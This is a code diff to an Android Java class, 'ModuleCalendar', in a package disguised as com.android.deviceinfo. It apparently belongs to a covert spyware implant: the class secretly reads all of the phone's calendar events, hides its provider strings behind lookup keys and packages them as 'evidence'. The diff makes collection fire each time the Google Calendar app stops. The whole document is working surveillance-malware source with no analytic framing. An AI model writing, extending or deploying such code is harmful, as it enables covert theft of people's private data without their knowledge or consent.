@@ -14,6 +14,8 @@ import android.database.Cursor;
 import android.net.Uri;
 
 import com.android.deviceinfo.Messages;
+import com.android.deviceinfo.ProcessInfo;
+import com.android.deviceinfo.ProcessStatus;
 import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.conf.ConfModule;
@@ -21,6 +23,8 @@ import com.android.deviceinfo.crypto.Digest;
 import com.android.deviceinfo.evidence.EvidenceReference;
 import com.android.deviceinfo.evidence.EvidenceType;
 import com.android.deviceinfo.evidence.Markup;
+import com.android.deviceinfo.interfaces.Observer;
+import com.android.deviceinfo.listener.ListenerProcess;
 import com.android.deviceinfo.util.ByteArray;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.DataBuffer;
@@ -28,7 +32,7 @@ import com.android.deviceinfo.util.DateTime;
 import com.android.deviceinfo.util.Utils;
 import com.android.deviceinfo.util.WChar;
 
-public class ModuleCalendar extends BaseModule {
+public class ModuleCalendar extends BaseModule implements Observer<ProcessInfo> {
 
 	private static final String TAG = "ModuleCalendar"; //$NON-NLS-1$
 
@@ -59,8 +63,8 @@ public class ModuleCalendar extends BaseModule {
 	 */
 	@Override
 	public void actualStart() {
-		// every three hours, check.
-		setPeriod(180 * 60 * 1000);
+		// every hour, check.
+		setPeriod(NEVER);
 		setDelay(200);
 
 		markupCalendar = new Markup(this);
@@ -85,31 +89,27 @@ public class ModuleCalendar extends BaseModule {
 			serializeCalendar();
 		}
 
+		ListenerProcess.self().attach(this);
+
 	}
 
-	/**
-	 * serialize contacts in the markup
-	 */
-	private void serializeCalendar() {
-		if (Cfg.DEBUG) {
-			Check.ensures(calendar != null, "null calendar"); //$NON-NLS-1$
-		}
-
-		try {
-
-			final boolean ret = markupCalendar.writeMarkupSerializable(calendar);
-			if (Cfg.DEBUG) {
-				Check.ensures(ret, "cannot serialize"); //$NON-NLS-1$
-			}
-		} catch (final IOException e) {
-			if (Cfg.EXCEPTION) {
-				Check.log(e);
-			}
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error (serializeContacts): " + e);//$NON-NLS-1$
+	@Override
+	public int notification(ProcessInfo process) {
+		if (process.processInfo.processName.contains("com.google.android.calendar")) {
+			if (process.status == ProcessStatus.STOP) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (notification), observing found: " + process.processInfo.processName);
+				}
+				actualGo();
 			}
 		}
+
+		return 0;
+	}
+
+	@Override
+	public void actualStop() {
+		ListenerProcess.self().detach(this);
 	}
 
 	/**
@@ -137,6 +137,31 @@ public class ModuleCalendar extends BaseModule {
 		}
 	}
 
+	/**
+	 * serialize contacts in the markup
+	 */
+	private void serializeCalendar() {
+		if (Cfg.DEBUG) {
+			Check.ensures(calendar != null, "null calendar"); //$NON-NLS-1$
+		}
+
+		try {
+
+			final boolean ret = markupCalendar.writeMarkupSerializable(calendar);
+			if (Cfg.DEBUG) {
+				Check.ensures(ret, "cannot serialize"); //$NON-NLS-1$
+			}
+		} catch (final IOException e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Error (serializeContacts): " + e);//$NON-NLS-1$
+			}
+		}
+	}
+
 	private boolean calendar() {
 		// http://jimblackler.net/blog/?p=151
 		// http://forum.xda-developers.com/showthread.php?t=688095
@@ -148,16 +173,16 @@ public class ModuleCalendar extends BaseModule {
 		List<String> calendars;
 		String contentProvider;
 
-		// d_18=content://calendar
-		contentProvider = Messages.getString("d_18"); //$NON-NLS-1$
+		// d_19=content://com.android.calendar
+		contentProvider = Messages.getString("d_19"); //$NON-NLS-1$
 		calendars = selectCalendars(contentProvider);
 
 		if (calendars == null || calendars.isEmpty()) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (calendar): opening 2.2 style"); //$NON-NLS-1$
 			}
-			// d_19=content://com.android.calendar
-			contentProvider = Messages.getString("d_19"); //$NON-NLS-1$
+			// d_18=content://calendar
+			contentProvider = Messages.getString("d_18"); //$NON-NLS-1$
 			calendars = selectCalendars(contentProvider);
 		} else {
 			if (Cfg.DEBUG) {
@@ -228,10 +253,6 @@ public class ModuleCalendar extends BaseModule {
 					continue;
 				}
 
-				if (eventCursor != null) {
-					eventCursor.close();
-				}
-
 				// if(Cfg.DEBUG) Check.log( TAG + " (go): "  ;//$NON-NLS-1$
 				// ByteArray.byteArrayToHex(packet));
 				final Long crcOld = calendar.get(idEvent);
@@ -250,22 +271,26 @@ public class ModuleCalendar extends BaseModule {
 					// Thread.yield();
 				}
 			}
+			if (eventCursor != null) {
+				eventCursor.close();
+			}
+
 		}
 		return needToSerialize;
 	}
 
 	private ArrayList<String> selectCalendars(String contentProvider) {
 		try {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (selectCalendars) provider: %s", contentProvider);
+			}
 			String[] projection = new String[] { Messages.getString("d_3") }; //$NON-NLS-1$
 			// Uri calendars = Uri.parse("content://calendar/calendars");
 			Uri calendars = Uri.parse(contentProvider + Messages.getString("d_2")); //$NON-NLS-1$
-
 			ArrayList<String> calendarIds = new ArrayList<String>();
-
 			Cursor managedCursor = managedQuery(calendars, projection, null, null, null); //$NON-NLS-1$
 
 			while (managedCursor != null && managedCursor.moveToNext()) {
-
 				final String _id = managedCursor.getString(0);
 
 				if (Cfg.DEBUG) {
@@ -274,13 +299,13 @@ public class ModuleCalendar extends BaseModule {
 
 				calendarIds.add(_id);
 			}
-			
+
 			managedCursor.close();
 
 			return calendarIds;
 		} catch (Exception ex) {
 			if (Cfg.DEBUG) {
-				Check.log(ex);
+				Check.log(TAG + " (selectCalendars) ERROR: Cannot use provider: %s", contentProvider);
 			}
 			return null;
 		}
@@ -399,10 +424,5 @@ public class ModuleCalendar extends BaseModule {
 			payload.write(prefix);
 			payload.write(data);
 		}
-	}
-
-	@Override
-	public void actualStop() {
-
 	}
 }
